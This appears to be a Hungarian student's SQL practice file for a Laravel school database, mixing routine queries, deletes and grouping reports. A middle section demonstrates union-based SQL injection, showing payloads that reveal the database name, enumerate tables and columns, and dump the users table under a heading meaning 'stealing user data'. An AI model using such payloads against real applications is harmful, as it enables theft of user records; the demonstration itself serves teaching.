CREATE DATABASE `laravel-iskola3`
	CHARACTER SET utf8
	COLLATE utf8_hungarian_ci;


select * from sports;
delete from sports where id>9;

select * from osztalies;
select * from diaks;
#delete from diaks where osztalyId in (9, 10,11, 13);

#delete FROM osztalies where id > 8;

select * from users;
// delete from users where id=28;

select * from sportolas;

select * from sportolas
  where diakokId = 2 AND sportokId = 2;

SELECT id, osztalyId, nev,neme,szuletett,helyseg, osztondij, atlag from diaks 
            WHERE nev = 'Feri'
union select * from users;

select database();


# sql injection
select * from diaks
  where nev = "Feri";

# union
select * from diaks
union 
select *, '', '', '', '', '', '', '', '' from osztalies
;






# mi az adatbázis neve
select database();

SELECT * from diaks 
  WHERE nev = "Feri" union select database(), '', '', '', '', '', '', '', '', '';#";

SELECT * from diaks d
  inner join osztalies o on d.osztalyId = o.id
  WHERE nev = "Feri" union select database(),'','', '', '', '', '', '', '', '', '', '';#";

# milyen táblák vannak
SELECT table_name from information_schema.tables
  WHERE table_schema = 'laravel-iskola3'; 

SELECT * from diaks 
  WHERE nev = "Feri" union SELECT table_name, '', '', '', '', '', '', '', '', '' from information_schema.tables WHERE table_schema = 'laravel-iskola3'; 



# táblának milyen oszlopai vannak
SELECT column_name from information_schema.columns
  WHERE table_name='users' AND table_schema = 'laravel-iskola3';

SELECT * from diaks 
  WHERE nev = "Feri" union SELECT column_name, '', '', '', '', '', '', '', '', '' from information_schema.columns WHERE  table_name='users' AND  table_schema = 'laravel-iskola3';#"; 

# user adatok ellopása


SELECT * from diaks 
  WHERE nev = "Feri" union select *, '', '' from users;#";


# Tesztek
  SHOW INDEX FROM sports;

  DESCRIBE osztalies;

  DESCRIBE diaks;

  SHOW KEYS FROM diaks;

  SELECT 
    TABLE_NAME,
    COLUMN_NAME,
    CONSTRAINT_NAME,
    REFERENCED_TABLE_NAME,
    REFERENCED_COLUMN_NAME
FROM 
    information_schema.KEY_COLUMN_USAGE
WHERE
    TABLE_NAME = 'diaks';

# Kapcsolatok és idegen kulcsok

SELECT 
    TABLE_NAME,
    COLUMN_NAME,
    CONSTRAINT_NAME,
    REFERENCED_TABLE_NAME,
    REFERENCED_COLUMN_NAME
FROM 
    information_schema.KEY_COLUMN_USAGE
WHERE
    TABLE_NAME = 'sportolas' and CONSTRAINT_SCHEMA = 'laravel-iskola3' and CONSTRAINT_NAME <> 'PRIMARY';


# -----------------

select helyseg, GROUP_CONCAT(nev SEPARATOR ', ') nevek from diaks
  GROUP BY helyseg;

select helyseg, count(*) db  from diaks
  
  GROUP BY helyseg
order by db desc
  ;


select o.osztalyNev, GROUP_CONCAT(d.nev SEPARATOR ', ') nevek from diaks d
  inner join osztalies o on d.osztalyId = o.id
  GROUP BY o.osztalyNev
  ;



SELECT o.osztalyNev, GROUP_CONCAT(nev ORDER BY d.nev SEPARATOR ', ') AS nevek  FROM diaks d
  INNER JOIN osztalies o ON d.osztalyId = o.id
  GROUP BY osztalyNev;



SELECT * FROM (SELECT o.osztalyNev, d.nev FROM diaks d inner JOIN osztalies o ON d.osztalyId = o.id ORDER BY o.osztalyNev, d.nev) AS tabla   
;

-- SELECT 
--     osztalyNev,
--     GROUP_CONCAT(nev SEPARATOR ', ') AS tanulok
-- FROM 
--     tanulok_tablaja  -- Helyettesítsd a táblád nevével
-- GROUP BY 
--     osztalyNev;